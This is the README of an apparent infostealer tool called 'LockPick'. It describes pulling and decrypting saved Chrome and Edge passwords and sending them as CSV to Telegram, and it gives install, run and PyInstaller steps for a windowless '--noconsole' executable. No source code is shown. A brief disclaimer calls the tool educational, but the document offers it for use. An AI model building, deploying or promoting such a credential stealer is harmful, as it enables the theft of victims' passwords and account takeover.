# LockPick

LockPick is a tool designed to extract and decrypt saved passwords from both Google Chrome and Microsoft Edge. This tool utilizes data extraction techniques from the browsers' databases and employs encryption to retrieve stored passwords.

## Features

- Extracts saved passwords from Google Chrome and Microsoft Edge.
- Decrypts the retrieved passwords using a secret key.
- Saves passwords in an Excel file with separate sheets for each browser.
- Sends results in CSV format to Telegram.

## Requirements

Before running this tool, ensure you have:

- Python 3.x installed.
- Required Python modules, including:
  - `os`
  - `json`
  - `base64`
  - `sqlite3`
  - `Cryptodome`
  - `shutil`
  - `platform`
  - `win32crypt`
  - `tempfile`
  - `pandas`
  - `requests`

You can install the required modules using pip:

```bash
pip install pycryptodomex pywin32 requests pandas
```

## Usage

1. **Clone the Repository:**

   Clone this repository to your local machine using the following command:

   ```bash
   git clone https://github.com/mnovel/LockPick.git
   ```

2. **Navigate to the Directory:**

   Change into the project directory:

   ```bash
   cd LockPick
   ```

3. **Run the Script:**

   Execute the script using Python:

   ```bash
   python LockPick.py
   ```

4. **Convert to EXE:**

   You can convert the Python script to an executable (.exe) file using **PyInstaller**. If you haven't installed it yet, do so with:

   ```bash
   pip install pyinstaller
   ```

   After that, run the following command to convert the script:

   ```bash
   pyinstaller --onefile --noconsole LockPick.py
   ```

   The executable file will be created in the `dist` folder.

## Important Notes

- The use of this tool must comply with applicable laws and regulations. Do not use this tool for illegal purposes or to harm others.
- This tool is for educational and cybersecurity research purposes only.

## Contributing

If you would like to contribute to this project, please create a pull request or open an issue in the repository.

## License

This project is licensed under the [MIT License](LICENSE).
